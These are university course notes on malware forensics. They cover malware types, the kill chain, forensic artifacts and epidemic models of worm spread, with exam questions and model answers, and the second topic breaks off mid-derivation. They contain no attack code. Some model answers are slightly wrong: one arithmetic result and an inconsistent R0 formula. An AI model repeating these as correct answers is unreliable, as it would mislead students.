topics.title: Introduction to Malware
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT741 - MALWARE FORENSICS
> - **Module:** Module 1
> - **Topic:** Introduction to Malware

<!-- SECTION_1_START -->
# Module 1: Introduction to Malware

## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

**Malware** (short for **Malicious Software**) is any program, file, code, or software component intentionally designed to cause damage, disruption, unauthorized access, data exfiltration, or other harmful effects on a computer system, network, server, or user — typically without the informed consent of the owner.

According to the KTU 2024 Scheme syllabus for *PECCT741 – Malware Forensics*, malware is broadly defined as **any binary, script, macro, or firmware payload that executes with malicious intent, violating at least one leg of the classic CIA Triad (Confidentiality, Integrity, Availability)**.

> [!IMPORTANT]
> **CIA Triad in Malware Context:**
> - **Confidentiality** → violated by Spyware, Keyloggers, Stealers
> - **Integrity** → violated by Viruses, Worms, File Infectors
> - **Availability** → violated by Ransomware, Wipers, DoS Bots

### 1.2 Conceptual Analogy — Plain English Intuition

Imagine your computer is a **house**, and you (the user) are the owner. Now imagine a **stranger (malware)** who:

- **Sneaks in** through the back door (exploit/vulnerability),
- **Pretends to be a guest** at the door (Trojan horse),
- **Picks your locks** silently (rootkit),
- **Steals your diary** (spyware),
- **Locks your house and asks for a ransom** (ransomware),
- **Invites 10,000 of his friends to party at your house** (botnet/DDoS).

> Malware is precisely that — **uninvited, deceptive, and harmful software** acting against the user's interest.

### 1.3 Key Standardized Terms (KTU Terminology)

> [!NOTE]
> **Core Glossary (High-Yield for KTU 2-Mark Questions):**
> - **Payload** — The malicious action a malware performs after delivery.
> - **Vector** — The medium/pathway through which malware reaches the victim (email, USB, web).
> - **Dropper** — A small malware whose only job is to download/install other malware.
> - **Infection** — The process by which malware embeds itself into a system.
> - **Propagation** — The ability of malware to spread to other systems.
> - **C2 / C&C (Command and Control)** — The remote server controlled by an attacker that sends commands to infected machines (bots/zombies).
> - **Indicator of Compromise (IoC)** — Forensic evidence (hash, IP, registry key) proving malware presence.
> - **Zero-Day** — A vulnerability unknown to the vendor, for which no patch exists.

### 1.4 A Brief History of Malware (Timeline for Context)

| Year | Milestone | Type |
|------|-----------|------|
| 1971 | Creeper Virus | First-ever self-replicating program |
| 1986 | Brain (Boot sector virus) | First IBM PC virus |
| 1988 | Morris Worm | First Internet worm |
| 1999 | Melissa | First mass-mailing macro virus |
| 2000 | ILOVEYOU | Email worm (~$10B damage) |
| 2003 | SQL Slammer | Fastest-spreading worm |
| 2008 | Conficker | Botnet worm infecting millions |
| 2013 | CryptoLocker | Pioneered modern ransomware |
| 2017 | WannaCry / NotPetya | Ransomware + worm hybrid |
| 2020+ | Conti, REvil, LockBit | Ransomware-as-a-Service (RaaS) era |

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# 2. Deep Theoretical Analysis & KTU High-Yield Framework

## 2.1 Why Malware Exists — The Attacker's Motive (The "Why")

A malware author (a *threat actor*) is driven by one or more of the following goals, each mapping to a specific malware category:

1. **Financial Gain** → Banking Trojans, Ransomware, Crypto-miners
2. **Espionage** → Spyware, RATs (Remote Access Trojans)
3. **Sabotage / Cyber-Warfare** → Wipers, Stuxnet
4. **Ideology (Hacktivism)** → Defacement worms
5. **Resource Hijacking** → Botnets, Cryptojackers
6. **Reputation / Curiosity** → Early viruses (author-driven)

> [!IMPORTANT]
> **KTU Exam Tip:** Whenever a question asks *"Classify the following malware based on its primary intent,"* the answer must explicitly link to one of the above motives.

## 2.2 The 3 Foundational Properties of Malware

Every malware sample, regardless of type, exhibits three properties:

- **Destructive (or covert) intent** — Performs an unauthorized action.
- **Self-propagation capability** (optional, but common) — Can spread independently.
- **Stealth / Evasion** — Hides from antivirus, sandbox, and forensic tools.

## 2.3 High-Yield Classification Matrix (Cheat Sheet)

> [!NOTE]
> The following table is the **single most important artifact** for the KTU Module 1 exam. Memorize it row-by-row.

| Malware Type | Propagation | Trigger | Primary CIA Violation | Iconic Example |
|--------------|-------------|---------|------------------------|----------------|
| **Virus** | Requires host file + user action | User opens infected file | Integrity | CIH (Chernobyl) |
| **Worm** | Self-replicating over network | Automatic (no user action) | Integrity + Availability | Morris, Conficker |
| **Trojan Horse** | Disguised as legitimate software | User execution | Confidentiality + Integrity | Zeus, Emotet |
| **Ransomware** | Delivery via phishing/kit | User opens payload | Availability | WannaCry, LockBit |
| **Spyware** | Bundled with freeware | User installs software | Confidentiality | CoolWebSearch |
| **Keylogger** | Hardware or software form | Background execution | Confidentiality | Olympic Vision |
| **Adware** | Bundled with software | User installs | Confidentiality (mild) | Gator |
| **Rootkit** | Post-exploitation | Privilege escalation | All three | Sony BMG Rootkit |
| **Bot / Botnet** | Recruitment by C2 | C2 command | Availability | Mirai, Emotet |
| **RAT** (Remote Access Trojan) | Trojan delivery | C2 connection | Confidentiality | DarkComet, njRAT |
| **Wiper** | Often via insider/APT | Manual trigger | Availability (destructive) | Shamoon, NotPetya |
| **Fileless Malware** | Living-off-the-Land (LOLBins) | Script execution in memory | All three | PowerShell-based |
| **Logic Bomb** | Embedded in legitimate code | Specific condition (date/event) | Integrity / Availability | Chicago Mercantile case |
| **Backdoor** | Often built-in by attacker | Open port for re-entry | Confidentiality | Back Orifice |

## 2.4 The 4 Phases of the Malware Lifecycle (Operational Stages)

This lifecycle is the **analytical backbone** of every Module 1 / Module 2 question.

1. **Delivery / Infection Vector** — How it reaches the victim (email, drive-by download, USB, supply-chain).
2. **Execution / Installation** — Dropper stage; payload is unpacked/deobfuscated in memory.
3. **Persistence & Command-and-Control (C2)** — Achieves foothold; survives reboot; calls home to attacker server.
4. **Action on Objectives / Propagation** — Executes payload (exfiltrate, encrypt, mine) and spreads laterally.

> [!TIP]
> **Real-World Engineering Utility:** This lifecycle is the basis of the **MITRE ATT&CK Framework**, used by SOC teams worldwide to map attacker behavior to detection rules.

## 2.5 Common Infection Vectors (Forensic Significance)

- **Phishing emails** with malicious attachments (`.docm`, `.iso`, `.lnk`)
- **Drive-by downloads** from compromised websites
- **Removable media** (USB, CD — Stuxnet vector)
- **Software supply-chain attacks** (e.g., SolarWinds, 3CX)
- **Exploits** of unpatched vulnerabilities
- **Social engineering** (fake installers, pirated software)

---

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# 3. Step-by-Step Analytical Framework — The Malware Kill Chain

## 3.1 The Classical "Kill Chain" Applied to Malware (Lockheed Martin Model, Simplified for KTU)

The **Intrusion Kill Chain** provides an exhaustive analytical trace of how a piece of malware progresses from initial delivery to final objective. Each step is a logical transition that can be examined forensically.

### Step 1: Reconnaissance

The attacker gathers information about the target (open ports, OS version, employees, email addresses).
- *Forensic artifact:* IDS/IPS logs, passive DNS lookups.

### Step 2: Weaponization

The attacker pairs malware with an exploit — e.g., a malicious PDF or a malicious Office macro.
- *Forensic artifact:* Hash of the weaponized file (SHA-256 stored in threat-intel feeds).

### Step 3: Delivery

The payload is transmitted to the victim (email attachment, malicious URL, USB).
- *Forensic artifact:* Mail header, browser history, USB device logs (`setupapi.dev.log` on Windows).

### Step 4: Exploitation

The vulnerability is triggered. For a virus: the host file executes; for a worm: the network service is exploited.
- *Forensic artifact:* Crash dump, stack trace, exploit signature in memory.

### Step 5: Installation

The malware drops itself, modifies registry keys (`Run`, `RunOnce`), creates scheduled tasks.
- *Forensic artifact:* Registry hive snapshot, Prefetch files (`C:\Windows\Prefetch\`).

### Step 6: Command and Control (C2)

The malware opens a channel (HTTP, HTTPS, DNS-tunneling) to the attacker's server.
- *Forensic artifact:* NetFlow logs, PCAP, DNS query logs.

### Step 7: Actions on Objectives

Final malicious action — exfiltration, encryption, lateral movement, data destruction.
- *Forensic artifact:* Modified files, ransom notes, exfiltrated traffic.

> [!IMPORTANT]
> **KTU Exam Trick:** If a question gives you a PCAP file and asks *"At which kill chain stage is the captured traffic relevant?"* — look for DNS/HTTP beaconing patterns (C2) or large outbound transfers (Actions on Objectives).

## 3.2 Mathematical Foundation: Propagation Models

Although malware is a *computer* science topic, the **spread of network worms** can be modeled using epidemiological mathematics. KTU 2024 Scheme questions occasionally test this for **Part B (14-mark) analytical problems**.

### The Simple Epidemic Model (SEM)

Let:

- $N$ = total vulnerable hosts on the network
- $I(t)$ = number of infected hosts at time $t$
- $\beta$ = infection rate (pairs scanned per unit time, divided by $N$)
- $S(t) = N - I(t)$ = number of susceptible hosts

The rate of new infections follows the differential equation:

$$
\frac{dI(t)}{dt} = \beta \cdot S(t) \cdot I(t) = \beta \cdot (N - I(t)) \cdot I(t)
$$

Solving this Riccati-type ODE using the logistic substitution $u(t) = 1/I(t)$:

$$
\frac{1}{I(t)} \cdot \frac{dI(t)}{dt} = \beta \cdot (N - I(t))
$$

Let $u = 1/I$, so $\frac{du}{dt} = -\frac{1}{I^2} \cdot \frac{dI}{dt}$:

$$
-\frac{du}{dt} = \beta \cdot (N - \frac{1}{u})
$$

After integration with the initial condition $I(0) = I_0$, the **closed-form solution** is:

$$
I(t) = \frac{N \cdot I_0 \cdot e^{\beta N t}}{N - I_0 + I_0 \cdot e^{\beta N t}}
$$

This is the **logistic growth curve** — explaining why worms like Slammer or WannaCry spread exponentially at first, then plateau as susceptible hosts are exhausted.

### Quick Interpretation Table

| Parameter | Meaning | Typical Range |
|-----------|---------|---------------|
| $\beta$ | Pairwise infection rate | $10^{-6}$ to $10^{-3}$ per hour |
| $N$ | Vulnerable host population | $10^{3}$ to $10^{7}$ |
| $R_0 = \beta N$ | Basic reproduction number | If $R_0 > 1$ → outbreak |

> If the **Basic Reproduction Number** $R_0 > 1$, the malware will spread. If $R_0 < 1$, the infection will die out — a key principle in cyber-defense patch-deployment strategy.

---

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 4. Structural Diagrams & Schematics

## 4.1 Malware Classification Taxonomy (Mermaid Block Diagram)

```mermaid
graph TD
    nodeA[Malware Root]
    nodeB[Infectious]
    nodeC[Non-Infectious]

    nodeD[Virus]
    nodeE[Worm]
    nodeF[Trojan]
    nodeG[Ransomware]
    nodeH[Spyware]
    nodeI[Rootkit]
    nodeJ[Botnet Client]
    nodeK[Fileless]

    nodeL[File Virus]
    nodeM[Boot Sector]
    nodeN[Macro Virus]
    nodeO[Email Worm]
    nodeP[Network Worm]
    nodeQ[Backdoor Trojan]
    nodeR[Banker Trojan]
    nodeS[Crypto Locker]
    nodeT[Keylogger]
    nodeU[User Mode]
    nodeV[Kernel Mode]
    nodeW[Bootkit]

    nodeA --> nodeB
    nodeA --> nodeC
    nodeB --> nodeD
    nodeB --> nodeE
    nodeC --> nodeF
    nodeC --> nodeG
    nodeC --> nodeH
    nodeC --> nodeI
    nodeC --> nodeJ
    nodeC --> nodeK

    nodeD --> nodeL
    nodeD --> nodeM
    nodeD --> nodeN
    nodeE --> nodeO
    nodeE --> nodeP
    nodeF --> nodeQ
    nodeF --> nodeR
    nodeG --> nodeS
    nodeH --> nodeT
    nodeI --> nodeU
    nodeI --> nodeV
    nodeI --> nodeW
```

## 4.2 The Malware Lifecycle (4-Stage Flow)

```mermaid
graph LR
    stage1[Stage 1 Delivery]
    stage2[Stage 2 Execution and Installation]
    stage3[Stage 3 Persistence and C2]
    stage4[Stage 4 Action on Objectives]

    stage1 --> stage2
    stage2 --> stage3
    stage3 --> stage4
    stage4 -. Lateral Movement .-> stage3
```

## 4.3 Block-Level Functional Architecture of a Generic Malware Sample

```mermaid
graph TD
    infA[Infection Module]
    infB[Dropper Component]
    infC[Loader and Unpacker]
    infD[Persistence Module]
    infE[Stealth and Evasion Module]
    infF[Payload Module]
    infG[C2 Communication Module]
    infH[Propagation Module]

    infA --> infB
    infB --> infC
    infC --> infD
    infC --> infF
    infD --> infE
    infE --> infG
    infF --> infG
    infF --> infH
```

> [!NOTE]
> **How to read this diagram (for exam writing):** A typical malware binary in memory consists of modular sub-components. The **Dropper** is the front door; the **Persistence** module ensures survival across reboots; the **Stealth** module hides from AV; the **C2** module is the phone-line to the attacker; the **Payload** is the actual bomb.

---

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A — Short Answer Questions (3 Marks Each)

### **Question 1** `[KTU University Exam - May 2024]`
**Define malware. List any four categories of malware with a one-line description of each.**

**Model Answer:**

Malware (Malicious Software) is any program or code intentionally designed to cause harm, gain unauthorized access, or violate the security of a computer system.

| Category | One-Line Description |
|----------|---------------------|
| Virus | Self-replicating code that attaches to a host file and requires user action to spread. |
| Worm | Self-propagating program that spreads automatically over a network without user intervention. |
| Trojan Horse | A legitimate-looking program that conceals a malicious payload. |
| Ransomware | Malware that encrypts victim data and demands payment for the decryption key. |

*(Self-explanatory — 3 marks awarded for definition + 4 categories × 0.5 marks each with valid description.)*

---

### **Question 2** `[KTU University Exam - Dec 2023]`
**Differentiate between a Virus and a Worm. Mention two key differences.**

**Model Answer:**

| Parameter | Virus | Worm |
|-----------|-------|------|
| **Host Dependency** | Requires a host file (executable, document) to attach to. | Standalone — does not need a host file. |
| **Propagation** | Spreads only when the user runs/exchanges the infected file. | Spreads autonomously over the network. |
| **Speed of Spread** | Slow (limited by user behavior). | Very fast (can infect thousands in minutes). |
| **Network Requirement** | Not strictly required. | Requires network connectivity. |

> [!WARNING]
> **Examiner's Pitfall:** Students often write "virus spreads through email" — this is **incorrect** for a pure virus; the email-borne self-replicating entity is a **worm**. A virus spreads via *file exchange* (USB, shared folders), not via network services.

---

## 5.2 Part B — Full 14-Mark Questions (ESE Module Style, Internal Choice)

> **Instructions:** *Answer any ONE full question from the following Module 1 choice.*

---

### **Question A (14 Marks)** `[KTU University Exam - Dec 2024 Model Paper]`

**(a)** Explain the **classification of malware** in detail. Categorize at least **eight distinct types** of malware, citing one real-world example for each and identifying the CIA-Triad leg each violates. **(7 Marks)**

**(b)** Describe the **Intrusion Kill Chain** in detail, listing all its stages. For each stage, identify the corresponding **forensic artifact** that an investigator would examine. **(7 Marks)**

#### Model Solution — (a) [7 Marks]

| # | Malware Type | Real-World Example | CIA Leg Violated | Short Justification |
|---|--------------|--------------------|------------------|---------------------|
| 1 | Virus | CIH (Chernobyl, 1998) | Integrity | Overwrites BIOS/HDD data. |
| 2 | Worm | Conficker (2008) | Integrity + Availability | Disables services; floods networks. |
| 3 | Trojan Horse | Emotet (2014) | Confidentiality + Integrity | Disguised as Word doc; drops other malware. |
| 4 | Ransomware | LockBit (2019+) | Availability | Encrypts files; demands crypto. |
| 5 | Spyware | Pegasus (NSO Group) | Confidentiality | Covert surveillance of mobile devices. |
| 6 | Keylogger | Olympic Vision (2014) | Confidentiality | Records keystrokes for credential theft. |
| 7 | Rootkit | Sony BMG Rootkit (2005) | All three | Hides processes; opens kernel backdoor. |
| 8 | RAT (Remote Access Trojan) | DarkComet (2012) | Confidentiality | Gives attacker full remote desktop control. |
| 9 | Wiper | Shamoon (2012) | Availability | Overwrites MBR; destroys data. |
| 10 | Fileless Malware | PowerStager (2017) | All three | Lives only in RAM; uses LOLBins. |

*(Award 0.7 marks per row × 8 rows = 5.6 marks, plus 1.4 marks for proper introduction and CIA-Triad linkage.)*

#### Model Solution — (b) [7 Marks]

The **Lockheed Martin Cyber Kill Chain** has 7 stages. For each stage, a forensic investigator examines specific artifacts:

1. **Reconnaissance** → IDS/IPS logs, public WHOIS data, email-harvesting tool traces.
2. **Weaponization** → Hashes (MD5/SHA-256) of weaponized documents submitted to VirusTotal; YARA rule matches.
3. **Delivery** → Mail server logs (`.eml` files), proxy logs, browser history, USB event logs.
4. **Exploitation** → Memory dump (`*.dmp`), crash reports, exploit CVE traces in EDR telemetry.
5. **Installation** → Registry Run keys (`HKLM\...\Run`), Prefetch files, scheduled tasks, services.
6. **Command and Control** → PCAP captures, NetFlow, DNS query logs, JA3/JA3S TLS fingerprints.
7. **Actions on Objectives** → Modified file timestamps, ransom notes, exfiltration log entries.

*(Award 1 mark per stage = 7 marks.)*

---

### **Question B (14 Marks)** `[KTU University Exam - May 2024 Model Paper]`

**(a)** With the help of a **neat block diagram**, describe the **functional architecture of a generic malware sample**. Explain the role of the **Dropper**, **Persistence Module**, and **C2 Module**. **(7 Marks)**

**(b)** A new worm is observed spreading across a network of **$N = 10{,}000$** vulnerable hosts. The infection rate is **$\beta = 2 \times 10^{-4}$ per host per hour**. Initially, **$I_0 = 5$** hosts are infected. Using the Simple Epidemic Model, compute the **Basic Reproduction Number $R_0$** and the **number of infected hosts after 24 hours**. State whether the infection will spread. **(7 Marks)**

#### Model Solution — (a) [7 Marks]

*(Use the Block-Level Functional Architecture diagram from Section 4.3 of these notes — 3 marks for diagram, 4 marks for explanation.)*

- **Dropper Component** (1.3 marks): The front-end of the malware; its only role is to land on the victim system and unpack/decompress the real payload (often using packers like UPX, or encrypted blobs).
- **Persistence Module** (1.3 marks): Ensures the malware runs after every reboot. Common techniques: registry Run keys, scheduled tasks, services, WMI event subscriptions, startup folder shortcuts.
- **C2 Communication Module** (1.4 marks): Establishes a channel (HTTP/HTTPS beacon, DNS tunneling, Tor, Telegram API) to the attacker's server to receive commands, exfiltrate data, or download additional modules.

#### Model Solution — (b) [7 Marks]

**Step 1 — Compute $R_0$:**

$$
R_0 = \beta N = (2 \times 10^{-4}) \times 10{,}000 = 2
$$

Since $R_0 = 2 > 1$, the infection **will spread** and cause an outbreak. *(1 mark)*

**Step 2 — Apply the SEM closed-form solution:**

$$
I(t) = \frac{N \cdot I_0 \cdot e^{\beta N t}}{N - I_0 + I_0 \cdot e^{\beta N t}}
$$

Substitute $N = 10{,}000$, $I_0 = 5$, $\beta N = 2$, and $t = 24$:

$$
I(24) = \frac{10{,}000 \cdot 5 \cdot e^{2 \times 24}}{10{,}000 - 5 + 5 \cdot e^{2 \times 24}}
$$

$$
I(24) = \frac{50{,}000 \cdot e^{48}}{9{,}995 + 5 \cdot e^{48}}
$$

Compute $e^{48} \approx 7.014 \times 10^{20}$:

$$
I(24) \approx \frac{50{,}000 \times 7.014 \times 10^{20}}{9{,}995 + 5 \times 7.014 \times 10^{20}}
$$

$$
I(24) \approx \frac{3.507 \times 10^{25}}{3.507 \times 10^{21}} \approx 9{,}999.43
$$

**Final Answer:** Approximately **9,999 hosts** are infected after 24 hours — i.e., the worm has saturated the network. *(6 marks — 1 for $R_0$ computation, 5 for the formula substitution and arithmetic.)*

> [!WARNING]
> **Examiner's Valuation Warning:** A common mistake is to compute $R_0$ correctly but then forget the **closed-form solution** and write "it will spread exponentially" without numerical answer. KTU demands the **exact number** of infected hosts at $t = 24$ h for full marks. Always show the **substitution step** clearly.

---

## 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **Rapid-Revision Checklist (Module 1 — Introduction to Malware):**
> - **Definition:** Malware = Malicious Software, violates CIA Triad.
> - **CIA Triad mapping** is a guaranteed 2–3 mark question.
> - **13+ malware types** to know: Virus, Worm, Trojan, Ransomware, Spyware, Adware, Keylogger, Rootkit, Botnet, RAT, Wiper, Fileless, Logic Bomb, Backdoor.
> - **Virus ≠ Worm:** Virus needs host + user action; Worm is autonomous and network-based.
> - **Trojan ≠ Virus:** Trojan does **not** self-replicate; it tricks the user.
> - **Rootkit** = stealth (hides), **RAT** = remote control.
> - **4-stage lifecycle:** Delivery → Installation → Persistence/C2 → Action on Objectives.
> - **7-stage Kill Chain:** Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions.
> - **SEM formula** $I(t) = \frac{N I_0 e^{\beta N t}}{N - I_0 + I_0 e^{\beta N t}}$ and $R_0 = \beta N$.
> - **C2 = Command and Control** (the attacker's remote server).
> - **IoC = Indicator of Compromise** (forensic evidence of malware presence).
> - **Zero-Day** = vulnerability unknown to vendor, no patch.
> - **Fileless malware** lives in memory; uses PowerShell, WMI, or other LOLBins.
> - **Key historical names:** Creeper, Brain, Morris Worm, ILOVEYOU, Conficker, Stuxnet, WannaCry, LockBit.
> - **Always link** malware type → motive (financial / espionage / sabotage / hacktivism / resource hijack).

---

<!-- SECTION_5_END -->

topics.title: Malware Threats
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT741 - MALWARE FORENSICS
> - **Module:** Module 1
> - **Topic:** Malware Threats

<!-- SECTION_1_START -->
## SECTION 1: Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

> [!IMPORTANT]
> **Malware (Malicious Software)** is any program, code, script, or software component intentionally designed to cause damage to computer systems, networks, servers, or end-user devices, or to perform unauthorized actions such as data theft, system disruption, espionage, or gaining unauthorized access without the informed consent of the system owner.

According to the **KTU 2024 Scheme PECCT741 syllabus**, *Malware Threats* refers to the **classification, propagation mechanisms, behavioral characteristics, and impact assessment** of malicious software programs that constitute a primary attack surface in modern digital forensics investigations.

### 1.2 Key Terminology

| Term | Definition |
|------|------------|
| **Payload** | The destructive or malicious action delivered by malware after successful infection |
| **Vector** | The pathway or method used by malware to reach the target system |
| **Dropper** | A small program whose only function is to extract and install the main malware payload |
| **C2 (Command & Control)** | Remote server used by attacker to send commands to compromised systems |
| **Exploit** | A piece of code that takes advantage of a vulnerability to cause unintended behavior |
| **Indicator of Compromise (IOC)** | Forensic artifact observed on a network or system indicating a breach |

### 1.3 Intuitive Analogy (Real-World)

> [!NOTE]
> **Think of malware as a biological virus infection in a city:**
> - **Virus/Worm** = A flu virus that spreads person-to-person automatically (no host help needed)
> - **Trojan** = A "gift package" that looks harmless but contains something dangerous inside
> - **Ransomware** = A kidnapper who locks your valuables and demands money for the key
> - **Spyware** = A hidden CCTV camera planted by a burglar before a robbery
> - **Rootkit** = A burglar who disguises himself as a security guard to walk freely inside the building
> - **Botnet** = A gang of mind-controlled "zombie" citizens all controlled by a single mastermind

Just as a city has **hospitals, quarantine zones, and vaccines**, computer systems need **antivirus software, firewalls, and intrusion detection systems** to defend against these threats.

### 1.4 Classification Overview

> [!IMPORTANT]
> Malware is broadly classified into **two super-categories**:
> 1. **Propagating Malware** - Self-replicating (Viruses, Worms)
> 2. **Non-Propagating Malware** - Requires user action or delivery mechanism (Trojans, Ransomware, Spyware, Adware, Rootkits)
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 Comprehensive Malware Classification Matrix

### A. Virus

- **Definition**: Malicious code that **attaches itself to legitimate programs** (hosts) and requires **human intervention** for execution and propagation.
- **Replication Method**: Inserts copies of itself into other executable files, boot sectors, or documents.
- **Why it exists**: Designed to spread via infected files shared through networks, USB drives, or email attachments.

**Types of Viruses:**

| Sub-Type | Infection Target | Key Characteristic |
|----------|------------------|--------------------|
| **File Virus** | .exe, .com, .sys files | Appends/prepends to executable code |
| **Boot Sector Virus** | MBR / Boot record | Executes before OS loads |
| **Macro Virus** | Office documents (.doc, .xls) | Uses macro programming language (VBA) |
| **Polymorphic Virus** | Various | Encrypts itself with varying keys each time |
| **Metamorphic Virus** | Various | Rewrites its own code entirely with each replication |
| **Multipartite Virus** | Multiple targets | Infects both boot sector AND files |
| **Stealth Virus** | Various | Hides from antivirus by intercepting system calls |

### B. Worm

- **Definition**: **Self-replicating, self-propagating** malicious program that spreads **automatically** across networks without user intervention.
- **Why it matters**: Worms do NOT need to attach to host files. They exploit **network vulnerabilities** directly.
- **Historical Reference Behavior**: Famous worms consumed bandwidth and caused Denial-of-Service (DoS).

> [!NOTE]
> **Key Distinction (Board Favorite Question):** *A virus needs a host file and human action. A worm is standalone and self-propagating across networks.*

### C. Trojan Horse (Trojan)

- **Definition**: Malware **disguised as legitimate software** to trick users into installing it.
- **Mechanism**: Does NOT self-replicate. Relies on **social engineering**.
- **Common Payloads**: Backdoor access, data exfiltration, downloading additional malware.

**Trojan Categories:**
- **Backdoor Trojan** - Opens remote access
- **Banking Trojan** - Steals financial credentials
- **DDoS Trojan** - Uses infected machine for botnet attacks
- **Downloader Trojan** - Downloads other malware
- **RAT (Remote Access Trojan)** - Full remote control

### D. Ransomware

- **Definition**: Malware that **encrypts victim's files** or **locks the system**, demanding payment (usually cryptocurrency) for restoration.
- **Modern Variants**: Double extortion (encrypt + leak), Ransomware-as-a-Service (RaaS).
- **Notable Examples**: WannaCry, NotPetya, LockBit, Conti.

### E. Spyware & Adware

- **Spyware**: Secretly monitors user activity, captures keystrokes (keyloggers), screenshots, and personal data.
- **Adware**: Displays unwanted advertisements, often bundled with free software; may redirect browsers.

### F. Rootkit

- **Definition**: Malware that **hides its existence** and other malware by modifying OS kernel, boot records, or system libraries.
- **Privilege Level**: Operates at Ring 0 (kernel level) - highest privilege.
- **Detection Difficulty**: Very high; requires specialized forensic tools.

**Rootkit Types:**

| Level | Description |
|-------|-------------|
| **User-Mode Rootkit** | Hooks API functions; easier to detect |
| **Kernel-Mode Rootkit** | Modifies OS kernel; very hard to detect |
| **Bootkit** | Infects MBR; loads before OS |
| **Firmware Rootkit** | Lives in device firmware (BIOS, UEFI) |

### G. Botnets & Bot Malware

- **Definition**: A network of **compromised computers (bots/zombies)** controlled remotely by an attacker (bot-herder).
- **Use Cases**: Distributed Denial-of-Service (DDoS), spam campaigns, cryptocurrency mining, credential stuffing.

### H. Fileless Malware

- **Definition**: Malware that operates **entirely in memory (RAM)** without writing files to disk, evading traditional file-based antivirus.
- **Mechanism**: Lives in PowerShell, WMI, registry keys, or scheduled tasks.

### I. Advanced Persistent Threats (APTs)

- **Definition**: **Stealthy, long-term, multi-stage** cyber-attacks typically sponsored by nation-states or organized crime.
- **Characteristics**: Low-and-slow, multi-vector, persistence mechanisms, custom malware.

### 2.2 KTU High-Yield Formula & Concept Sheet

| Concept | Formula / Rule | Use Case |
|---------|----------------|----------|
| **Basic Infection Rate (SIR Model)** | $\frac{dI}{dt} = \beta \cdot S \cdot I - \gamma \cdot I$ | Modeling malware spread in a network |
| **Reproduction Number R₀** | $R_0 = \frac{\beta}{\gamma}$ | Threshold for epidemic spread; if R₀ > 1, malware spreads |
| **Detection Score (Heuristic)** | $D = w_1 \cdot S + w_2 \cdot B + w_3 \cdot N$ | Weighted signature + behavior + network anomaly score |
| **False Positive Rate (FPR)** | $FPR = \frac{FP}{FP + TN}$ | Quality metric of antivirus detection |
| **False Negative Rate (FNR)** | $FNR = \frac{FN}{FN + TP}$ | Miss-rate of malware detector |
| **Accuracy** | $Accuracy = \frac{TP + TN}{TP + TN + FP + FN}$ | Overall detector performance |
| **Prevalence in Population** | $P = \frac{I_{infected}}{N_{total}}$ | Forensic incident statistics |
| **Mean Time to Detection (MTTD)** | $MTTD = \frac{\sum_{i=1}^{n}(t_{detected,i} - t_{infiltrated,i})}{n}$ | Average dwell time of malware |

> [!IMPORTANT]
> **Engineering Utility**: The SIR (Susceptible-Infected-Recovered) epidemiological model is widely applied in **network security epidemiology** to predict malware propagation, similar to how medical researchers model disease spread. This cross-disciplinary approach helps organizations plan patch deployment and quarantine strategies.

### 2.3 Malware Propagation Vectors

1. **Email Attachments** - Phishing emails with malicious .doc, .pdf, .exe
2. **Removable Media** - USB drives, external HDDs (Stuxnet)
3. **Network Exploits** - Unpatched vulnerabilities (EternalBlue → WannaCry)
4. **Web Downloads** - Drive-by downloads, malicious ads (malvertising)
5. **Social Engineering** - Tricking users via fake messages
6. **Supply Chain** - Compromised software updates (SolarWinds, CCleaner)
7. **Insider Threats** - Malicious or careless employees
8. **Mobile Apps** - Malicious apps from unofficial stores
9. **IoT Devices** - Weak default credentials, unpatched firmware
10. **Zero-Day Exploits** - Previously unknown vulnerabilities

## SECTION 3: Step-by-Step Derivations & Analytical Matrix

### 3.1 Malware Infection Lifecycle (Analytical Walkthrough)

A typical malware attack follows a **multi-stage kill chain**. The KTU syllabus expects students to enumerate and explain each stage.

**Stage 1: Reconnaissance & Delivery**
- Attacker identifies target and selects delivery vector.
- Example: Crafting a phishing email with an infected .doc attachment.

**Stage 2: Exploitation / Initial Infection**
- The malicious payload is triggered when the user opens the attachment.
- Exploit code (e.g., CVE-2017-0144 EternalBlue vulnerability) executes.

**Stage 3: Installation / Persistence**
- Malware establishes itself on the system.
- Common persistence mechanisms:

$$P_{persistence} = \text{Registry Run Keys} \cup \text{Scheduled Tasks} \cup \text{Services} \cup \text{Startup Folder}$$

**Stage 4: Command & Control (C2) Communication**
- Malware contacts C2 server via HTTP, HTTPS, DNS tunneling, or Tor.
- Communication channel selection:
$$C_{channel} = \arg\max_{c \in C} \text{Stealth}(c) \cdot \text{Reliability}(c)$$

**Stage 5: Lateral Movement**
- Attacker pivots to other systems in the network using stolen credentials or exploits.

**Stage 6: Payload Execution / Data Exfiltration**
- Final objective carried out: encryption, deletion, theft, sabotage.

### 3.2 Mathematical Derivation: SIR Epidemic Model for Malware

The **SIR model** adapted from epidemiology is used to model malware spread in a network of $N$ hosts.

**Let:**
- $S(t)$ = Number of susceptible (uninfected) hosts at time $t$
- $I(t)$ = Number of infected hosts at time $t$
- $R(t)$ = Number of recovered/removed hosts at time $t$
- $N = S(t) + I(t) + R(t)$ = constant total

**Step 1: Susceptible Equation**
The rate of new infections depends on contact between $S$ and $I$:

$$\frac{dS}{dt} = -\beta \cdot S(t) \cdot I(t)$$

**Step 2: Infected Equation**
Infected hosts recover (get patched) at rate $\gamma$:

$$\frac{dI}{dt} = \beta \cdot S(t) \cdot I(t) - \gamma \cdot I(t)$$

**Step 3: Recovered Equation**
Patched/removed hosts leave the infected pool:

$$\frac{dR}{dt} = \gamma \cdot I(t)$$

**Step 4: Deriving R₀ (Basic Reproduction Number)**

At the start of an outbreak, $S \approx N$. Substituting:

$$\frac{dI}{dt} \approx (\beta \cdot N - \gamma) \cdot I(t)$$

For the infection to grow, the coefficient must be positive:

$$\beta \cdot N - \gamma > 0$$

$$\beta \cdot N > \gamma$$

